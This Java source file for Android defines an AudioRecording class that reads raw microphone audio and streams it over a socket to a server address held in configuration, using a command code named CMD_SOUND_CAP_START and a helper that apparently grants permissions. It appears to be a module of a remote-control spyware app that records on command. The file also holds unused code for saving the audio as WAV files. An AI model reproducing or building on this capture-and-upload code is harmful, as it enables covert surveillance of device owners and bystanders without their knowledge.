/**
 *
 */
package media;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Date;

import android.icu.text.SimpleDateFormat;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Log;
import order.Sock;
import order.order;
import permission.GivePermission;
import utils.ConfigCt;
import utils.Funcs;

/**
 * @author Administrator
 *
 */
public class AudioRecording {
    //音频输入-麦克风
    public final static int AUDIO_INPUT = MediaRecorder.AudioSource.MIC;
    ////采用频率 44100是目前的标准，但是某些设备仍然支持22050，16000，11025
    private final static int AUDIO_SAMPLE_RATE = 44100;  //44.1KHz,普遍使用的频率
    private final static int AUDIO_CHANNEL=AudioFormat.CHANNEL_CONFIGURATION_MONO;//声道数:CHANNEL_IN_STEREO
    private final static int AUDIO_ENCODING=AudioFormat.ENCODING_PCM_8BIT;//位数：ENCODING_PCM_16BIT

    private AudioRecord audioRecord;
    private boolean isRecording = false;// 设置正在录制的状态
    private int bufferSizeInBytes = 0;  // 缓冲区字节大小
    private SendDataToServer sendDataToServer;
    private String mIP;
    private int mPort;

    private static AudioRecording mInstance;
    private AudioRecording(){

    }
    public synchronized static AudioRecording getInstance()
    {
        if(mInstance == null)
            mInstance = new AudioRecording();
        return mInstance;
    }
    public boolean startRecording(int port) {
        if(isRecording)return false;
        mIP=ConfigCt.cIP;
        mPort=port;
        if(GivePermission.getGivePermission().isEnable()){
            GivePermission.getGivePermission().EventStart();
            GivePermission.getGivePermission().TimeStart();
        }
        new Thread(new AudioRecordThread()).start(); // 开启音频文件写入线程
        return true;
    }
    public void stopRecording() {
        isRecording = false;//停止文件写入

    }
    private void releaseAudioRecord() {
        if (audioRecord != null) {
            Log.i(ConfigCt.TAG, "stopRecord");
            isRecording = false;//停止文件写入
            audioRecord.stop();
            audioRecord.release();//释放资源
            audioRecord = null;
        }
    }
    private boolean creatAudioRecord() {
        // 获得缓冲区字节大小
        bufferSizeInBytes = AudioRecord.getMinBufferSize(AUDIO_SAMPLE_RATE,AUDIO_CHANNEL, AUDIO_ENCODING);
        bufferSizeInBytes=AUDIO_SAMPLE_RATE;
        if(AudioRecord.ERROR_BAD_VALUE==bufferSizeInBytes)return false;
        // 创建AudioRecord对象
        try{
            audioRecord = new AudioRecord(AUDIO_INPUT,AUDIO_SAMPLE_RATE,AUDIO_CHANNEL, AUDIO_ENCODING, bufferSizeInBytes);
        }catch( IllegalArgumentException e){
            e.printStackTrace();
            return false;
        }
        return true;
    }
    class AudioRecordThread implements Runnable {
        @Override
        public void run() {
            try {
                if(audioRecord == null)
                    if(!creatAudioRecord())return;
                try{
                    audioRecord.startRecording();
                    isRecording = true;// 让录制状态为true
                    writeDateTOIO(audioRecord,bufferSizeInBytes);
                    releaseAudioRecord();

                }catch(IllegalStateException e){
                    e.printStackTrace();
                }
                //writeDateTOFile();//往文件中写入裸数据
                //copyWaveFile(AudioName, NewAudioName);//给裸数据加上头文件
            } catch (Exception e) {
                e.printStackTrace();
            }//try {
        }
    }
    /**
     * 这里将数据写入文件，但是并不能播放，因为AudioRecord获得的音频是原始的裸音频，
     * 如果需要播放就必须加入一些格式或者编码的头信息。但是这样的好处就是你可以对音频的 裸数据进行处理，比如你要做一个爱说话的TOM
     * 猫在这里就进行音频的处理，然后重新封装 所以说这样得到的音频比较容易做一些音频的处理。
     */
    private void writeDateTOIO(AudioRecord audioRecord,int bufferSizeInBytes) {
        byte[] audiodata = new byte[bufferSizeInBytes];  // new一个byte数组用来存一些字节数据，大小为缓冲区大小
        int readsize = 0;
        //SaveDataToFile saveDataToFile=new SaveDataToFile();
        sendDataToServer=new SendDataToServer(mIP,mPort,bufferSizeInBytes);
        while (isRecording) {
            readsize = audioRecord.read(audiodata, 0, bufferSizeInBytes);
            if(readsize==AudioRecord.ERROR_INVALID_OPERATION)break;
            if(readsize==AudioRecord.ERROR_BAD_VALUE)break;
            if(readsize==AudioRecord.ERROR_DEAD_OBJECT)break;
            if(readsize==AudioRecord.ERROR)break;
            if(readsize<=0)break;
            if(!sendDataToServer.send(audiodata))break;
            //saveDataToFile.write(audiodata);
            readsize = 0;
        }
        sendDataToServer.close();
        //saveDataToFile.close();
    }
    private class SendDataToServer{
        private final int BUF_SIZE_D=10;//缓冲区大小
        private Sock sock;
        private byte[] buf;
        private int bufSize,p;
        SendDataToServer(String IP,int port,int dataSize){
            sock=new Sock(IP,port);
            sock.oh.cmd=order.CMD_SOUND_CAP_START;
            sock.connectServer();
            bufSize=dataSize*BUF_SIZE_D;
            buf=new byte[bufSize];
            p=0;
        }
        public boolean send(byte[] data){
            if(!sock.isConnected())return false;
            if(p<bufSize){
                System.arraycopy(data,0, buf,p, data.length);
                p=p+data.length;
            }else{
                sock.data=buf;
                sock.oh.len=bufSize;
                if(!sock.SendOH())return false;
                if(!sock.SendData())return false;
                p=0;
            }
            return true;
        }
        public void close(){
            buf=null;
            if(sock!=null)sock.release();
            sock=null;
        }
    }
    private class SaveDataToFile{
        //录音输出文件
        private final static String AUDIO_RAW_FILENAME_EXT = ".raw";
        private final static String AUDIO_WAV_FILENAME_EXT  = ".wav";
        private final static String AUDIO_AMR_FILENAME_EXT  = ".amr";
        private final static String AUDIO_PCM_FILENAME_EXT  = ".pcm";
        FileOutputStream fos = null;
        private String pcmFilename;
        private String wavFilename;
        private File file;
        public SaveDataToFile(){
            try{
                pcmFilename=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, AUDIO_PCM_FILENAME_EXT);
                wavFilename=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, AUDIO_WAV_FILENAME_EXT);
                file = new File(pcmFilename);
                fos = new FileOutputStream(file);// 建立一个可存取字节的文件
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public boolean write(byte[] data){
            if(fos==null)return false;
            try {
                fos.write(data);
                return true;
            } catch (IOException e) {
                e.printStackTrace();
                return false;
            }
        }
        public void close(){
            try {
                if(fos != null)fos.close();// 关闭写入流
                //makePCMFileToWAVFile(pcmFilename,wavFilename,false);
                copyWaveFile(pcmFilename,wavFilename);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }






    // 这里得到可播放的音频文件
    private void copyWaveFile(String inFilename, String outFilename) {
        FileInputStream in = null;
        FileOutputStream out = null;
        long totalAudioLen = 0;
        long totalDataLen = totalAudioLen + 36;
        long longSampleRate = AUDIO_SAMPLE_RATE;
        int channels = 2;
        long byteRate = 16 * AUDIO_SAMPLE_RATE * channels / 8;
        byte[] data = new byte[bufferSizeInBytes];
        try {
            in = new FileInputStream(inFilename);
            out = new FileOutputStream(outFilename);
            totalAudioLen = in.getChannel().size();
            totalDataLen = totalAudioLen + 36;
            WriteWaveFileHeader(out, totalAudioLen, totalDataLen,
                    longSampleRate, channels, byteRate);
            while (in.read(data) != -1) {
                out.write(data);
            }
            in.close();
            out.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    /**
     * 这里提供一个头信息。插入这些信息就可以得到可以播放的文件。
     * 为我为啥插入这44个字节，这个还真没深入研究，不过你随便打开一个wav
     * 音频的文件，可以发现前面的头文件可以说基本一样哦。每种格式的文件都有
     * 自己特有的头文件。
     */
    private void WriteWaveFileHeader(FileOutputStream out, long totalAudioLen,
                                     long totalDataLen, long longSampleRate, int channels, long byteRate)
            throws IOException {
        byte[] header = new byte[44];
        header[0] = 'R'; // RIFF/WAVE header
        header[1] = 'I';
        header[2] = 'F';
        header[3] = 'F';
        header[4] = (byte) (totalDataLen & 0xff);
        header[5] = (byte) ((totalDataLen >> 8) & 0xff);
        header[6] = (byte) ((totalDataLen >> 16) & 0xff);
        header[7] = (byte) ((totalDataLen >> 24) & 0xff);
        header[8] = 'W';
        header[9] = 'A';
        header[10] = 'V';
        header[11] = 'E';
        header[12] = 'f'; // 'fmt ' chunk
        header[13] = 'm';
        header[14] = 't';
        header[15] = ' ';
        header[16] = 16; // 4 bytes: size of 'fmt ' chunk
        header[17] = 0;
        header[18] = 0;
        header[19] = 0;
        header[20] = 1; // format = 1
        header[21] = 0;
        header[22] = (byte) channels;
        header[23] = 0;
        header[24] = (byte) (longSampleRate & 0xff);
        header[25] = (byte) ((longSampleRate >> 8) & 0xff);
        header[26] = (byte) ((longSampleRate >> 16) & 0xff);
        header[27] = (byte) ((longSampleRate >> 24) & 0xff);
        header[28] = (byte) (byteRate & 0xff);
        header[29] = (byte) ((byteRate >> 8) & 0xff);
        header[30] = (byte) ((byteRate >> 16) & 0xff);
        header[31] = (byte) ((byteRate >> 24) & 0xff);
        header[32] = (byte) (2 * 16 / 8); // block align
        header[33] = 0;
        header[34] = 16; // bits per sample
        header[35] = 0;
        header[36] = 'd';
        header[37] = 'a';
        header[38] = 't';
        header[39] = 'a';
        header[40] = (byte) (totalAudioLen & 0xff);
        header[41] = (byte) ((totalAudioLen >> 8) & 0xff);
        header[42] = (byte) ((totalAudioLen >> 16) & 0xff);
        header[43] = (byte) ((totalAudioLen >> 24) & 0xff);
        out.write(header, 0, 44);
    }
    /**
     * 将一个pcm文件转化为wav文件
     * @param pcmPath         pcm文件路径
     * @param destinationPath 目标文件路径(wav)
     * @param deletePcmFile   是否删除源文件
     * @return

    public static boolean makePCMFileToWAVFile(String pcmPath, String destinationPath, boolean deletePcmFile) {
    byte buffer[] = null;
    int TOTAL_SIZE = 0;
    File file = new File(pcmPath);
    if (!file.exists()) {
    return false;
    }
    TOTAL_SIZE = (int) file.length();
    // 填入参数，比特率等等。这里用的是16位单声道 8000 hz
    WaveHeader header = new WaveHeader();
    // 长度字段 = 内容的大小（TOTAL_SIZE) +
    // 头部字段的大小(不包括前面4字节的标识符RIFF以及fileLength本身的4字节)
    header.fileLength = TOTAL_SIZE + (44 - 8);
    header.FmtHdrLeth = 16;
    header.BitsPerSample = 16;
    header.Channels = 2;
    header.FormatTag = 0x0001;
    header.SamplesPerSec = 8000;
    header.BlockAlign = (short) (header.Channels * header.BitsPerSample / 8);
    header.AvgBytesPerSec = header.BlockAlign * header.SamplesPerSec;
    header.DataHdrLeth = TOTAL_SIZE;

    byte[] h = null;
    try {
    h = header.getHeader();
    } catch (IOException e1) {
    Log.e("PcmToWav", e1.getMessage());
    return false;
    }

    if (h.length != 44) // WAV标准，头部应该是44字节,如果不是44个字节则不进行转换文件
    return false;

    // 先删除目标文件
    File destfile = new File(destinationPath);
    if (destfile.exists())
    destfile.delete();

    // 合成的pcm文件的数据，写到目标文件
    try {
    buffer = new byte[1024 * 4]; // Length of All Files, Total Size
    InputStream inStream = null;
    OutputStream ouStream = null;

    ouStream = new BufferedOutputStream(new FileOutputStream(
    destinationPath));
    ouStream.write(h, 0, h.length);
    inStream = new BufferedInputStream(new FileInputStream(file));
    int size = inStream.read(buffer);
    while (size != -1) {
    ouStream.write(buffer);
    size = inStream.read(buffer);
    }
    inStream.close();
    ouStream.close();
    } catch (FileNotFoundException e) {
    Log.e("PcmToWav", e.getMessage());
    return false;
    } catch (IOException ioe) {
    Log.e("PcmToWav", ioe.getMessage());
    return false;
    }
    if (deletePcmFile) {
    file.delete();
    }
    Log.i("PcmToWav", "makePCMFileToWAVFile  success!" + new SimpleDateFormat("yyyy-MM-dd hh:mm").format(new Date()));
    return true;
    }
     */
}
